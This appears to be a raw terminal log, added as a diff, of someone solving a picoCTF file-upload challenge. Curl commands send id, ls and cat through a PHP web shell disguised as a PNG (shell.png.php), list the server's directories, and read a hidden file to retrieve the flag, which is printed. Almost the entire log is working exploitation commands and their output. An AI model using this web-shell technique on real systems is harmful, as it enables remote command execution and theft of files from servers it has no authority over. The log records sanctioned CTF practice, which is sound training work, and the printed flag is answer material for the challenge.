@@ -1,0 +1,113 @@
+─(white㉿white)-[~]
+└─$ curl "http://atlas.picoctf.net:64346/uploads/shell.png.php?cmd=id"   
+�PNG
+▒
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl "http://atlas.picoctf.net:64346/uploads/shell.png.php?cmd=ls"   
+�PNG
+▒
+shell.png.php
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl "http://atlas.picoctf.net:64346/uploads/shell.png.php?cmd=cat /<RANDOM>.txt"   
+curl: (3) URL rejected: Malformed input to a URL function
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl "http://atlas.picoctf.net:64346/uploads/shell.png.php?cmd=ls /"   
+curl: (3) URL rejected: Malformed input to a URL function
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl "http://atlas.picoctf.net:64346/uploads/shell.png.php?cmd=ls%20/"   
+�PNG
+▒
+bin
+boot
+challenge
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=ls /"
+curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=cat /<RANDOM>.txt"
+�PNG
+▒
+bin
+boot
+challenge
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+�PNG
+▒
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=ls /challenge"   
+�PNG
+▒
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=cat /challenge/<file>"   
+�PNG
+▒
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=ls /root"   
+�PNG
+▒
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=ls -la /var/www/html/"   
+�PNG
+▒
+total 16
+drwxrwxrwt 1 www-data www-data   21 Mar 12  2024 .
+drwxr-xr-x 1 root     root       18 Nov 21  2023 ..
+-rw-r--r-- 1 root     root       49 Mar 12  2024 HFQWKODGMIYTO.txt
+-rw-r--r-- 1 root     root     1572 Feb  7  2024 index.php
+-rw-r--r-- 1 root     root      415 Feb  7  2024 instructions.txt
+-rw-r--r-- 1 root     root       62 Feb  7  2024 robots.txt
+drwxr-xr-x 1 www-data root       27 Sep 15 16:07 uploads
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=cat HFQWKODGMIYTO.txt /var/www/html/"   
+�PNG
+▒
+                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ curl -G "http://atlas.picoctf.net:64346/uploads/shell.png.php" --data-urlencode "cmd=cat /var/www/html/HFQWKODGMIYTO.txt"   
+�PNG
+▒
+/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */                                                                                                                                                                       
+┌──(white㉿white)-[~]
+└─$ 
